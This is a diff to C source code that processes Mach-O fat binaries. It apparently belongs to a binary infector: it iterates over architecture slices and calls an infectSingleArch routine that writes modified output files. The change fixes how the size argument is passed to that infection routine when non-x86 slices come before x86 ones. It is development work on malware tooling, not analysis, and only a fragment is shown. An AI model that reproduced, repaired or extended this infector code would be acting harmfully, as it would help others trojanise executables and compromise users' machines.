@@ -1129,6 +1129,7 @@ main (int argc, _mChar *argv[])
       {
         gFileType     = 1;
         int x86Found  = 0;
+        int otherFound    = 0;
 
         gFileType = 1;
         nfat = gFatHeader.nfat_arch;
@@ -1164,11 +1165,23 @@ main (int argc, _mChar *argv[])
               {
                 x86Found++;
 
-                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                      (char *)(outputFilePointer),
-                                                      archOffset,
-                                                      fArchSize,
-                                                      outputFileSize);
+                if (otherFound == 1)
+                  {
+                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                          (char *)(outputFilePointer),
+                                                          archOffset,
+                                                          gInputFileSize,
+                                                          outputFileSize);
+                  }
+                else
+                  {
+                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                          (char *)(outputFilePointer),
+                                                          archOffset,
+                                                          fArchSize,
+                                                          outputFileSize);
+                  }
+
 #ifdef DEBUG
                 printf("offsetToRes: %d\n", offsetToResources);
 #endif
@@ -1190,6 +1203,10 @@ main (int argc, _mChar *argv[])
 #ifdef DEBUG_VERBOSE
                     printf ("new Offset: 0x%x\n", archOffset);
 #endif
+                  }
+                else
+                  {
+                    otherFound++;
                   }
 
                 u_int tempOfft = f_arch->offset;
